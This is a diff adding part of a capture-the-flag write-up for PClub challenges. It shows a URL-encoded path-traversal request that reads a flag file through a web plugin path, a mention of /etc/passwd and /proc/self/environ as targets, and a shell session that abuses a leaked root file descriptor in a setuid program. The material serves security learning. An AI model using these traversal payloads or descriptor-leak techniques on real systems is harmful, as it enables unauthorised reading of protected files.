@@ -95,3 +95,41 @@ Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ
 ✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
 ```
 
+### Challenge 2
+
+*challenge* - 13.235.21.137:4657  
+
+**FLAG**:```PClub{4lw4ys_cl05e_y0ur_fil3s}``` 
+
+Connected to terminal using:
+```nc 13.235.21.137 4657```
+
+ls Gives: 
+```$ ls file_chal file_chal.c ``` 
+
+Used cat to see the c script
+```
+cat file_chal.c
+
+#include <fcntl.h>
+#include <unistd.h>
+int main () {
+    int fd = open ("/root/flag", 0);
+// Dropping root previliges
+// definitely not forgetting anything
+    setuid (getuid ());
+    char* args[] = { "sh", 0 };
+    execvp ("/bin/sh", args);
+    return 0; }
+``` 
+
+Then to see the file descriptors used:
+``` 
+ls -l /proc/$$/fd
+
+total 0 lrwx------ 1 ctf ctf 64 May 23 09:35 0 -> /dev/pts/24
+lrwx------ 1 ctf ctf 64 May 23 09:35 1 -> /dev/pts/24
+lrwx------ 1 ctf ctf 64 May 23 09:35 2 -> /dev/pts/24
+lr-x------ 1 ctf ctf 64 May 23 09:35 3 -> /root/flag
+
+$ $ cat /proc/$$/fd/3 cat: /proc/2285/fd/3: Permission denied $ head /proc/$$/fd/3 strings /proc/$$/fd/3 dd if=/proc/$$/fd/3 bs=1 count=100 head: cannot open '/proc/2285/fd/3' for reading: Permission denied $ sh: 11: strings: not found $ dd: failed to open '/proc/2285/fd/3': Permission denied $ read line <&3 echo "$line" $ PClub{4lw4ys_cl05e_y0ur_fil3s} ```
